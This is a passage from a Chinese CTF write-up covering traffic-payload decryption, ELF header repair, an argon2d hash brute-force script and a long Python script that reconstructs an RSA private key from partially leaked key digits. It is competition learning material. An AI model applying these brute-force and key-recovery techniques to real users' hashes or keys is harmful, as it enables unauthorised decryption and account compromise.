class="line">f = open(&apos;./data/flag_dec.class&apos;,&apos;wb+&apos;)</span><br><span class="line">print decipher.decrypt(msg)</span><br><span class="line">b =  decipher.decrypt(msg)</span><br><span class="line">#print b</span><br><span class="line">f.write(b)</span><br></pre></td></tr></table></figure>

<ul>
<li>本来想逐一反编译class为java文件，突然发现参数是写在class文件中的，然后找到一个串加密的payload中有上传一个flag文件</li>
</ul>
<p><img src="https://upload-images.jianshu.io/upload_images/5808046-a55db191c76d1a52.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
<p><img src="https://upload-images.jianshu.io/upload_images/5808046-b9e71406241dbf53.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
<ul>
<li>于是把content的内容拿去base64解码后写入文件中，发现是elf文件，但是格式不对，根据<a href="https://blog.csdn.net/xuehuafeiwu123/article/details/72963229" target="_blank" rel="noopener">https://blog.csdn.net/xuehuafeiwu123/article/details/72963229</a>把第五字节到七字节修正，然后elf打开</li>
</ul>
<p><img src="https://upload-images.jianshu.io/upload_images/5808046-44ed489c872a009e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
<p><img src="https://upload-images.jianshu.io/upload_images/5808046-cafd59bb3fc62cd0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
<p>写脚本解密</p>
<p><img src="https://upload-images.jianshu.io/upload_images/5808046-df5a40abeba320f7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="强大的hash"><a href="#强大的hash" class="headerlink" title="强大的hash"></a>强大的hash</h2><ul>
<li>给了个hash，需要我们写脚本爆破，这里有个坑点是hash加密类型是<strong><em>$argon2d</em></strong>，不支持php</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">from argon2 import PasswordHasher</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">list = [&quot;114&quot;,&quot;119&quot;,&quot;110&quot;,&quot;120&quot;,&quot;121&quot;,&quot;122&quot;,&quot;170&quot;,&quot;189&quot;,&quot;180&quot;,&quot;133&quot;,&quot;144&quot;,&quot;911&quot;]</span><br><span class="line"></span><br><span class="line">ph = PasswordHasher()</span><br><span class="line">hash = &quot;$argon2d$v=19$m=32768,t=100,p=1$MTIzNDU2Nzg$iuSRO5tkWxBxqgkI5g9O5ZersA//xvgvrKxH8QuxBBI4yKbG4aRFqITP/Rh5giFRuL9PTJP+/0BUfNwZHzx9bQ&quot;</span><br><span class="line">for i in list:</span><br><span class="line">	for j in list:</span><br><span class="line">		char = &apos;CTF_&apos; + i + &apos;_&apos; + j</span><br><span class="line">		try:</span><br><span class="line">			print char</span><br><span class="line">			if (ph.verify(hash, char)):</span><br><span class="line">				print &apos;done : &apos;,char</span><br><span class="line">				exit(0)</span><br><span class="line">		except Exception:</span><br><span class="line">			pass</span><br></pre></td></tr></table></figure>

<p><img src="https://upload-images.jianshu.io/upload_images/5808046-efd53860a54ad4b0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
<h2 id="遗失的秘密"><a href="#遗失的秘密" class="headerlink" title="遗失的秘密"></a>遗失的秘密</h2><ul>
<li>见到过类似的题目<a href="https://www.40huo.cn/blog/rsa-private-key-recovery-and-oaep.html" target="_blank" rel="noopener">https://www.40huo.cn/blog/rsa-private-key-recovery-and-oaep.html</a>，先把n补全，然后改一改脚本的值，就能跑出flag</li>
</ul>
<p><img src="https://upload-images.jianshu.io/upload_images/5808046-77539fabecd65461.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">#-*- coding:utf-8 -*-</span><br><span class="line"></span><br><span class="line">import re</span><br><span class="line">import pickle</span><br><span class="line">from itertools import product</span><br><span class="line">from libnum import invmod, gcd</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def solve_linear(a, b, mod):</span><br><span class="line">    if a &amp; 1 == 0 or b &amp; 1 == 0:</span><br><span class="line">        return None</span><br><span class="line">    return (b * invmod(a, mod)) &amp; (mod - 1)  # hack for mod = power of 2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def to_n(s):</span><br><span class="line">    s = re.sub(r&quot;[^0-9a-f]&quot;, &quot;&quot;, s)</span><br><span class="line">    return int(s, 16)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def msk(s):</span><br><span class="line">    cleaned = &quot;&quot;.join(map(lambda x: x[-2:], s.split(&quot;:&quot;)))</span><br><span class="line">    return msk_ranges(cleaned), msk_mask(cleaned), msk_val(cleaned)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def msk_ranges(s):</span><br><span class="line">    return [range(16) if c == &quot; &quot; else [int(c, 16)] for c in s]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def msk_mask(s):</span><br><span class="line">    return int(&quot;&quot;.join(&quot;0&quot; if c == &quot; &quot; else &quot;f&quot; for c in s), 16)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def msk_val(s):</span><br><span class="line">    return int(&quot;&quot;.join(&quot;0&quot; if c == &quot; &quot; else c for c in s), 16)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">E = 65537</span><br><span class="line"></span><br><span class="line">N_ = &quot;&quot;&quot;00:c4:9d:36:a4:77:76:12:12:85:24:6c:74:1d:7d:</span><br><span class="line">    b3:ce:f4:c3:a4:69:cd:0b:2e:8f:d6:75:e3:80:b8:</span><br><span class="line">    e8:1c:ce:e8:60:90:45:56:73:ab:32:32:00:7f:6a:</span><br><span class="line">    76:3e:b6:10:d3:a2:74:da:f9:4e:a5:7e:ae:ef:f4:</span><br><span class="line">    da:82:57:6d:68:82:50:d8:b1:fc:92:b1:5c:7d:54:</span><br><span class="line">    f5:7e:d0:06:8a:60:ff:82:70:72:20:68:4b:71:ba:</span><br><span class="line">    87:44:57:c1:97:a0:8a:2d:53:93:f3:0a:60:87:a3:</span><br><span class="line">    85:c8:45:e6:0a:88:85:b5:ff:c7:09:9a:76:03:fe:</span><br><span class="line">    99:b6:fb:8a:1e:9f:a8:42:3a:0a:c9:a9:bf:1c:87:</span><br><span class="line">    2c:c4:99:10:db:46:e3:a9:a5:79:93:8c:75:71:ec:</span><br><span class="line">    c6:3b:af:44:dc:60:c4:53:f6:3c:e8:73:2f:50:10:</span><br><span class="line">    38:e7:6f:d0:a5:4b:ae:e3:1e:43:11:42:2c:a2:38:</span><br><span class="line">    e6:3f:0b:13:54:63:e8:2f:9e:61:ab:08:65:97:e0:</span><br><span class="line">    27:30:19:fd:a7:fe:5c:d8:11:b8:34:87:ad:02:c2:</span><br><span class="line">    bc:cd:73:d3:86:be:fd:2a:b4:fe:7d:7e:d3:64:bb:</span><br><span class="line">    6f:63:ed:a6:1d:ee:f2:80:da:9d:7a:23:7f:c1:39:</span><br><span class="line">    b0:98:0c:85:8f:d0:4b:9f:e4:1a:26:fc:44:d1:67:</span><br><span class="line">    03:32:03:0c:91:61:23:4c:81:6f:42:18:88:41:dc:</span><br><span class="line">    27:55:a3:07:7c:a1:ad:f3:58:4d:91:07:65:f1:63:</span><br><span class="line">    f2:34:d5:17:0e:59:c6:bb:b6:6d:7d:0c:d2:64:4b:</span><br><span class="line">    b9:9c:52:59:03:8e:2a:43:23:76:33:c3:e8:72:3b:</span><br><span class="line">    1c:e0:40:97:36:5f:ae:00:d7:e3:09:eb:df:55:44:</span><br><span class="line">    22:b4:09:00:b5:09:41:70:6c:5c:3b:98:d3:34:7e:</span><br><span class="line">    60:a2:b8:93:bd:af:32:77:48:48:8a:a5:9c:0e:6a:</span><br><span class="line">    a1:79:36:86:8c:e9:3f:b1:a2:a7:4a:3a:d8:d6:f6:</span><br><span class="line">    dd:62:d8:ae:9e:13:bb:0c:6b:b1:65:68:0d:7e:58:</span><br><span class="line">    3f:68:1e:91:49:13:19:68:2b:fd:3c:5e:52:fa:76:</span><br><span class="line">    b0:57:fc:0e:35:d8:71:56:41:06:ef:50:99:56:dd:</span><br><span class="line">    d4:9a:1f:d3:46:26:12:9c:15:4b:43:fc:1b:de:c9:</span><br><span class="line">    06:ad:82:56:63:c8:a4:83:32:d2:35:05:23:15:52:</span><br><span class="line">    d9:0a:73:85:5e:c9:c2:56:af:69:d2:5f:77:04:28:</span><br><span class="line">    c8:4c:b9:a6:d4:15:15:b5:15:99:13:ef:a9:a5:de:</span><br><span class="line">    5a:74:b1:03:cf:32:a5:03:69:f8:e9:bb:7e:16:31:</span><br><span class="line">    5e:43:e7:02:51:ac:c5:f6:bf:ef:1c:74:f7:13:0c:</span><br><span class="line">    19:ad:&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p_ranges, pmask_msk, pmask_val = msk(&quot;&quot;&quot;00:  :05:89:  :bd:35:  :  :23:  :  :  :  :84:</span><br><span class="line">      :  :ed:  :70:14:  :  :  :10:  :  :87:  :51:</span><br><span class="line">    ea:  :97:69:  :52:  :  :  :  :  :ea:  :  :15:</span><br><span class="line">      :  :34:  :be:11:23:  :  :34:14:  :94:  :10:</span><br><span class="line">      :  :74:87:37:ee:81:62:ee:95:  :  :dc:49:dd:</span><br><span class="line">      :  :35:  :81:  :fa:  :  :  :86:  :  :  :fb:</span><br><span class="line">      :93:  :  :12:  :14:  :ab:76:  :96:  :  :27:</span><br><span class="line">      :21:  :04:01:41:  :98:  :ff:  :  :12:dc:  :</span><br><span class="line">    cd:  :39:95:30:  :47:  :fa:ff:  :34:  :ad:  :</span><br><span class="line">      :52:02:fa:bc:14:22:22:48:61:62:bd:53:  :  :</span><br><span class="line">    72:08:cb:41:88:  :  :  :63:91:30:fe:  :  :42:</span><br><span class="line">    87:  :18:52:  :39:dd:  :68:  :fe:06:88:81:  :</span><br><span class="line">      :  :  :ae:fd:  :  :fb:21:37:59:  :53:  :fa:</span><br><span class="line">      :07:40:eb:33:77:51:64:10:dd:  :73:  :86:62:</span><br><span class="line">      :bf:  :79:  :34:  :bb:  :44:ff:  :46:fe:90:</span><br><span class="line">    ef:  :52:ad:  :  :fe:  :69:18:89:bd:cd:09:46:</span><br><span class="line">      :  :74:71:  :  :  :41:66:  :  :11:  :25:  :</span><br><span class="line">    39:8b&quot;&quot;&quot;)</span><br><span class="line"></span><br><span class="line">q_ranges, qmask_msk, qmask_val = msk(&quot;&quot;&quot;00:ce:43:ef:  :76:58:17:43:31:  :  :32:70:  :</span><br><span class="line">    89:  :  :36:55:06:  :79:66:78:  :  :  :  :  :</span><br><span class="line">      :85:  :  :  :  :  :33:bb:  :  :56:  :66:cb:</span><br><span class="line">      :08:  :  :90:cb:  :  :24:fa:ca:47:  :  :  :</span><br><span class="line">      :88:  :83:01:  :62:  :  :  :  :  :  :ad:ae:</span><br><span class="line">      :  :  :58:  :ec:  :  :  :09:04:86:  :05:00:</span><br><span class="line">      :df:50:84:81:80:  :ae:  :24:  :94:da:  :04:</span><br><span class="line">    ce:  :ef:  :  :ed:be:bf:43:78:  :  :05:93:  :</span><br><span class="line">    08:52:05:  :  :  :  :ae:  :  :  :  :ab:  :  :</span><br><span class="line">      :76:ce:  :  :  :  :19:bd:22:  :ef:dc:bf:ea:</span><br><span class="line">    ab:78:01:  :  :85:  :  :  :ea:  :  :fb:  :  :</span><br><span class="line">    92:66:19:  :  :ab:  :  :82:  :  :31:  :  :da:</span><br><span class="line">    82:  :13:82:43:  :  :94:13:41:  :  :  :37:  :</span><br><span class="line">      :04:56:02:87:dd:  :58:27:  :  :24:  :  :  :</span><br><span class="line">    28:  :  :09:14:89:  :  :  :49:59:  :16:eb:65:</span><br><span class="line">      :01:22:  :  :dd:  :78:  :  :db:90:  :ac:  :</span><br><span class="line">      :fd:  :03:74:  :  :  :  :92:  :00:ba:  :  :</span><br><span class="line">      :05&quot;&quot;&quot;)</span><br><span class="line"></span><br><span class="line">_, dmask_msk, dmask_val = msk(&quot;&quot;&quot;11:  :  :69:62:64:  :  :  :  :15:  :13:de:de:</span><br><span class="line">    cf:  :  :17:  :  :75:  :98:42:fc:  :12:15:08:</span><br><span class="line">      :  :  :  :  :36:  :be:25:48:  :  :19:  :  :</span><br><span class="line">      :47:11:19:  :03:  :49:fc:da:  :96:45:eb:  :</span><br><span class="line">      :  :  :91:  :ea:  :  :55:ff:  :37:58:  :  :</span><br><span class="line">    19:  :  :73:40:  :91:15:01:da:91:22:fd:32:  :</span><br><span class="line">      :  :50:  :  :66:  :  :  :42:  :  :ef:  :  :</span><br><span class="line">    df:42:  :97:30:  :39:  :  :  :  :  :  :dc:  :</span><br><span class="line">      :  :  :  :  :38:  :  :  :88:28:  :05:  :  :</span><br><span class="line">    78:59:fa:  :86:  :19:24:  :  :  :  :da:cf:15:</span><br><span class="line">    39:  :  :  :  :ef:55:  :ce:47:  :58:89:  :fb:</span><br><span class="line">      :24:  :  :  :92:  :  :ee:  :  :db:67:31:ce:</span><br><span class="line">      :28:  :72:ec:89:  :04:  :  :50:  :  :  :  :</span><br><span class="line">      :37:  :44:  :  :  :  :56:  :38:  :bb:47:bb:</span><br><span class="line">    66:83:99:22:07:72:  :  :48:52:02:  :  :  :29:</span><br><span class="line">      :82:56:  :67:  :95:  :  :56:94:  :  :71:  :</span><br><span class="line">    bf:27:98:  :  :54:98:26:06:87:  :ae:  :53:be:</span><br><span class="line">      :  :80:37:60:61:ea:ef:de:  :  :df:90:81:  :</span><br><span class="line">    70:  :06:33:26:  :75:fe:95:  :92:  :78:cd:05:</span><br><span class="line">    64:cc:68:  :  :36:54:  :bd:16:90:ee:60:  :  :</span><br><span class="line">      :  :41:  :  :91:  :79:58:06:50:  :46:  :  :</span><br><span class="line">    45:  :09:ca:ac:16:  :27:98:  :  :ba:82:  :77:</span><br><span class="line">    93:98:ad:  :15:  :67:53:97:ad:ee:50:44:  :31:</span><br><span class="line">    07:  :ff:01:  :09:  :  :  :  :  :46:  :  :42:</span><br><span class="line">    15:  :db:df:42:be:  :  :  :78:  :41:  :  :  :</span><br><span class="line">      :14:  :  :25:fc:  :84:  :  :  :  :  :  :20:</span><br><span class="line">    da:46:01:eb:87:  :12:57:  :  :56:af:  :87:93:</span><br><span class="line">    60:  :02:  :18:89:63:72:ad:  :ed:cf:  :  :84:</span><br><span class="line">      :22:  :13:  :  :dd:  :ff:  :  :  :de:62:37:</span><br><span class="line">      :19:66:  :  :86:02:  :38:  :  :  :  :ec:14:</span><br><span class="line">    12:  :43:93:19:65:98:  :  :03:  :  :  :ef:  :</span><br><span class="line">      :  :ca:07:92:22:  :  :bb:15:eb:  :  :  :35:</span><br><span class="line">      :72:29:cd:  :  :99:  :  :  :  :41:06:  :  :</span><br><span class="line">      :43:33:  :32:  :  :54:be:92:62:  :78:59:42:</span><br><span class="line">    79:89&quot;&quot;&quot;)</span><br><span class="line"></span><br><span class="line">_, dpmask_msk, dpmask_val = msk(&quot;&quot;&quot; :39:  :28:16:02:89:ce:11:fe:  :  :  :  :af:</span><br><span class="line">      :  :  :ed:97:  :  :11:20:ba:ae:98:ad:  :  :</span><br><span class="line">      :10:87:ac:07:  :  :  :  :50:  :  :70:50:52:</span><br><span class="line">    df:89:eb:02:  :  :  :  :93:11:  :  :12:  :56:</span><br><span class="line">      :08:  :  :ea:  :10:fa:19:  :  :  :54:45:07:</span><br><span class="line">      :  :bc:ff:33:  :db:63:49:fe:52:  :33:  :  :</span><br><span class="line">    bf:cd:45:91:  :10:  :  :92:81:40:03:  :80:  :</span><br><span class="line">    29:  :30:  :ed:43:64:ca:  :bf:64:  :  :bf:  :</span><br><span class="line">      :  :  :24:72:84:  :  :ff:  :  :24:  :81:27:</span><br><span class="line">    db:23:  :64:  :67:  :ba:  :  :bc:  :  :  :  :</span><br><span class="line">      :ae:88:  :  :  :  :  :91:  :  :14:  :ba:ef:</span><br><span class="line">      :89:  :  :  :  :  :  :  :  :05:  :75:52:  :</span><br><span class="line">      :  :  :be:ad:df:  :02:88:00:  :  :15:45:  :</span><br><span class="line">    cf:32:  :ca:  :93:  :32:  :40:  :27:dd:  :19:</span><br><span class="line">    73:dc:  :  :  :  :  :cf:  :  :dd:  :  :ca:  :</span><br><span class="line">    ee:  :ca:  :  :  :49:  :27:  :58:53:  :64:25:</span><br><span class="line">      :22:06:16:ff:62:bc:  :  :  :  :24:fc:  :  :</span><br><span class="line">    df&quot;&quot;&quot;)</span><br><span class="line"></span><br><span class="line">_, dqmask_msk, dqmask_val = msk(&quot;&quot;&quot;02:  :bd:  :19:25:98:75:  :65:  :55:28:33:bc:</span><br><span class="line">    34:84:91:01:96:  :  :08:  :32:45:  :27:  :  :</span><br><span class="line">      :fe:  :bb:63:32:68:  :51:bd:75:40:  :52:52:</span><br><span class="line">      :  :  :78:85:fc:94:  :07:  :14:  :  :  :  :</span><br><span class="line">    15:dd:  :  :93:  :01:  :  :77:ca:  :40:  :da:</span><br><span class="line">      :89:bc:87:62:dc:ac:61:88:  :  :70:  :69:  :</span><br><span class="line">      :36:  :  :21:08:  :dc:73:  :ad:da:ee:fe:  :</span><br><span class="line">    96:  :58:  :  :46:  :29:ff:97:ce:  :  :  :cb:</span><br><span class="line">    51:  :  :81:  :22:  :  :19:  :10:69:41:36:ca:</span><br><span class="line">      :22:49:  :cc:cf:06:  :  :08:  :76:  :  :45:</span><br><span class="line">    98:  :  :45:  :  :  :69:13:65:  :  :da:54:  :</span><br><span class="line">    19:  :ee:24:  :73:  :  :  :  :  :  :18:53:40:</span><br><span class="line">    21:25:  :  :84:52:cd:  :49:33:78:  :  :ed:  :</span><br><span class="line">    25:27:  :  :  :ca:  :  :  :ca:  :  :bc:  :02:</span><br><span class="line">    31:70:  :10:ca:84:59:  :  :  :52:  :27:76:  :</span><br><span class="line">    47:  :66:bf:ff:  :03:  :99:ff:  :df:  :  :  :</span><br><span class="line">      :46:27:45:  :65:07:  :48:da:dc:  :80:  :  :</span><br><span class="line">    f9&quot;&quot;&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def search(K, Kp, Kq, check_level, break_step):</span><br><span class="line">    max_step = 0</span><br><span class="line">    cands = [0]</span><br><span class="line">    for step in range(1, break_step + 1):</span><br><span class="line">        #print &quot; &quot;, step, &quot;( max =&quot;, max_step, &quot;)&quot;</span><br><span class="line">        max_step = max(step, max_step)</span><br><span class="line"></span><br><span class="line">        mod = 1 &lt;&lt; (4 * step)</span><br><span class="line">        mask = mod - 1</span><br><span class="line"></span><br><span class="line">        cands_next = []</span><br><span class="line">        for p, new_digit in product(cands, p_ranges[-step]):</span><br><span class="line">            pval = (new_digit &lt;&lt; ((step - 1) * 4)) | p</span><br><span class="line"></span><br><span class="line">            if check_level &gt;= 1:</span><br><span class="line">                qval = solve_linear(pval, N &amp; mask, mod)</span><br><span class="line">                if qval is None or not check_val(qval, mask, qmask_msk, qmask_val):</span><br><span class="line">                    continue</span><br><span class="line"></span><br><span class="line">            if check_level &gt;= 2:</span><br><span class="line">                val = solve_linear(E, 1 + K * (N - pval - qval + 1), mod)</span><br><span class="line">                if val is None or not check_val(val, mask, dmask_msk, dmask_val):</span><br><span class="line">                    continue</span><br><span class="line"></span><br><span class="line">            if check_level &gt;= 3:</span><br><span class="line">                val = solve_linear(E, 1 + Kp * (pval - 1), mod)</span><br><span class="line">                if val is None or not check_val(val, mask, dpmask_msk, dpmask_val):</span><br><span class="line">                    continue</span><br><span class="line"></span><br><span class="line">            if check_level &gt;= 4:</span><br><span class="line">                val = solve_linear(E, 1 + Kq * (qval - 1), mod)</span><br><span class="line">                if val is None or not check_val(val, mask, dqmask_msk, dqmask_val):</span><br><span class="line">                    continue</span><br><span class="line"></span><br><span class="line">                if pval * qval == N:</span><br><span class="line">                    print &quot;Kq =&quot;, Kq</span><br><span class="line">                    print &quot;pwned&quot;</span><br><span class="line">                    print &quot;p =&quot;, pval</span><br><span class="line">                    print &quot;q =&quot;, qval</span><br><span class="line">                    p = pval</span><br><span class="line">                    q = qval</span><br><span class="line">                    d = invmod(E, (p - 1) * (q - 1))</span><br><span class="line">                    coef = invmod(p, q)</span><br><span class="line"></span><br><span class="line">                    from Crypto.PublicKey import RSA</span><br><span class="line">                    print RSA.construct(map(long, (N, E, d, p, q, coef))).exportKey()</span><br><span class="line">                    quit()</span><br><span class="line"></span><br><span class="line">            cands_next.append(pval)</span><br><span class="line"></span><br><span class="line">        if not cands_next:</span><br><span class="line">            return False</span><br><span class="line">        cands = cands_next</span><br><span class="line">    return True</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def check_val(val, mask, mask_msk, mask_val):</span><br><span class="line">    test_mask = mask_msk &amp; mask</span><br><span class="line">    test_val = mask_val &amp; mask</span><br><span class="line">    return val &amp; test_mask == test_val</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># K = 4695</span><br><span class="line"># Kp = 15700</span><br><span class="line"># Kq = 5155</span><br><span class="line"></span><br><span class="line">for i in range(0xff):</span><br><span class="line">    N = N_ + hex(i)[2:].rjust(2,&apos;0&apos;)</span><br><span class="line"></span><br><span class="line">    N = to_n(N)</span><br><span class="line">    print &quot;index : &quot;,i</span><br><span class="line"></span><br><span class="line">    for K in range(1, E):</span><br><span class="line">        # if K % 100 == 0:</span><br><span class="line">        #     print &quot;checking&quot;, K</span><br><span class="line">        if search(K, 0, 0, check_level=2, break_step=20):</span><br><span class="line">            print &quot;K =&quot;, K</span><br><span class="line">            break</span><br><span class="line"></span><br><span class="line">    for Kp in range(1, E):</span><br><span class="line">        # if Kp % 1000 == 0:</span><br><span class="line">        #     print &quot;checking&quot;, Kp</span><br><span class="line">        if search(K, Kp, 0, check_level=3, break_step=30):</span><br><span class="line">            print &quot;Kp =&quot;, Kp</span><br><span class="line">            break</span><br><span class="line"></span><br><span class="line">    for Kq in range(1, E):</span><br><span class="line">        # if Kq % 100 == 0:</span><br><span class="line">        #     print &quot;checking&quot;, Kq</span><br><span class="line">        if search(K, Kp, Kq, check_level=4, break_step=9999):</span><br><span class="line">            print &quot;Kq =&quot;, Kq</span><br><span class="line">            break</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line"># coding=utf-8</span><br><span class="line">from Crypto.PublicKey import RSA</span><br><span class="line">from Crypto.Cipher import PKCS1_OAEP</span><br><span 